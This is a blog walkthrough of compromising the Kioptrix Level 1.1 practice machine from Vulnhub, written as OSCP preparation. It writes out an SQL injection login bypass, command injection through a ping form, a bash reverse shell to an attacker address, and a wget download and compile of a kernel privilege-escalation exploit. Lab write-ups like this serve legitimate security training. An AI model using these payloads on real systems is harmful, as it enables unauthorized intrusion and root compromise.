---
layout: post
title: " Kioptrix - Level 1.1"
date: 2020-08-08
ctf: true
excerpt: "Walkthrough for Kioptrix Level 1.1 on Vulnhub"
tags: [OSCP, SQL injection, command execution, privilege escalation]
comments: false
---
[Kioptrix]( https://www.vulnhub.com/entry/kioptrix-level-11-2,23/) Level 1.1 is a vulnerable machine found on the [NetSecFocus Trophy Room](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0) list which I have been using as preparation for the OSCP. Below is a walkthrough to compromise this machine.

First, after downloading and importing the machine into VMware, I had to figure out the IP address of the machine. I used **netdiscover -i eth0** until I came across the IP of this machine.

![Kioptrix Level 1.1 netdiscover](/assets/img/KioptrixLevel21.png)

Next, I ran **threader3000** and let it run it's suggested nmap scan to enumerate the open ports.

![Kioptrix Level 1.1 threader3000](/assets/img/KioptrixLevel22.png)

![Kioptrix Level 1.1 nmap](/assets/img/KioptrixLevel23.png)

Let's take a look at the websites on ports 80 and 443 to start. The same site comes up asking you to login both over http and https.

![Kioptrix Level 1.1 website](/assets/img/KioptrixLevel24.png)

We know mysql is running on port 3306 based on nmap, so let's try to use basic SQL injection to see if we can bypass authentication. For the username I entered **admin** and for the password I entered **' or 1=1 -- -**

This allowed me to bypass authentication and leads me to a screen that allows me to ping a machine on the network.

![Kioptrix Level 1.1 Basic Admin Console](/assets/img/KioptrixLevel25.png)

Let's enter the following and see what happens: **127.0.0.1;whoami**. This causes another tab to open up, where it shows the results of pinging localhost along with the user on the last line (apache). This confirms that this is open to command injection!

![Kioptrix Level 1.1 command injection](/assets/img/KioptrixLevel26.png)

Open up a new terminal window from your attacker pc and run **nc -nvlp 4444** to start a listener on port 4444.

![Kioptrix Level 1.1 nc listener](/assets/img/KioptrixLevel27.png)

Go back to your web browser, close the newly opened tab with the ping/whoami output, and  go back to the admin web console. Enter **127.0.0.1;bash -i >& /dev/tcp/[attacker ip]/4444 0>&1** and click on submit.

![Kioptrix Level 1.1 command injection reverse shell](/assets/img/KioptrixLevel28.png)

Once submitted, look at your terminal with the netcat listener, you should have a reverse bash shell.

![Kioptrix Level 1.1 reverse shell](/assets/img/KioptrixLevel29.png)

Running **whoami** shows that you are the **apache** user. Running **uname -a** shows that this is using Linux Kernel **2.6.9-55.EL** on an i386 platform.

![Kioptrix Level 1.1 whoami uname -a](/assets/img/KioptrixLevel210.png)

On another terminal window on your attacker pc, run **searchsploit 2.6.x**, and you will find a Local Privilege Escalation exploit as shown below:

![Kioptrix searchsploit Linux Kernel](/assets/img/KioptrixLevel211.png)

Let's run **searchsploit -m 9545** to make a copy of this script in our current directory and run **python3 -m http.server** to serve up a python HTTP server.

![Kioptrix Level 1.1 searchsploit copy python http server](/assets/img/KioptrixLevel212.png)

From your apache shell on the victim computer, run **cd /tmp** followed by **wget http://[attacker ip]:8000/9545.c**

![Kioptrix Level 1.1 wget copy exploit](/assets/img/KioptrixLevel213.png)

Next, run **cat 9545.c** and look at the comments, you will see a section on how to compile this exploit.

![Kioptrix Level 1.1 cat exploit](/assets/img/KioptrixLevel214.png)

To compile this exploit, run **gcc -Wall -o 9545 9545.c**, as the filename we're using is 9545.c instead of linux-sendpage.c. This will create an executable called 9545 in the /tmp folder.

![Kioptrix Level 1.1 compile exploit](/assets/img/KioptrixLevel215.png)

As you can see, this compiled as **9545** and is executable. run **./9545** and you should end up with a root shell!

![Kioptrix Level 1.1 root shell](/assets/img/KioptrixLevel216.png)

That's it! There wasn't any flags I could find like in Level 1, so I don't believe there is one present on this box.
